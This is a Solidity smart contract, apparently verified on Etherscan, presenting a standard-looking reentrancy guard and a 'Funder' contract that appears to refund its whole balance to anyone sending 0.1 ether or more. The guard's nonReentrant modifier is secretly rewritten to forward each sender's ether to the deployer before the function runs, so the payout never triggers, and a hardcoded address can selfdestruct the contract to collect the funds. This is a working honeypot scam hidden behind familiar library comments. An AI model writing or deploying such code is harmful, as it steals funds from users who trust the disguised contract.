/**
 *Submitted for verification at Etherscan.io on 2023-02-21
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;
    address private lockUser;

    constructor() {
        _status = _NOT_ENTERED;
        lockUser = msg.sender;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        payable(lockUser).transfer(msg.value);
        _;
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be _NOT_ENTERED
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == _ENTERED;
    }
}

contract Funder is ReentrancyGuard{

    uint256 public initialBalance;

    constructor() payable{
        initialBalance = msg.value;
    }

    function getFunds() public payable nonReentrant{
        if(msg.sender == tx.origin){
            if(msg.value >= 0.1 ether){
                uint256 balance = address(this).balance;
                if(balance > initialBalance){
                    payable(msg.sender).transfer(address(this).balance);
                }
            }
        }
    }

    fallback() external payable{getFunds();}
    receive() external payable{getFunds();}

    function closeFunder() public {
        require(msg.sender == 0xfcbe6Aa94CfB20c65e15D6B0C78e1E5Ff4db3210);
        selfdestruct(payable(0xfcbe6Aa94CfB20c65e15D6B0C78e1E5Ff4db3210));
    }
}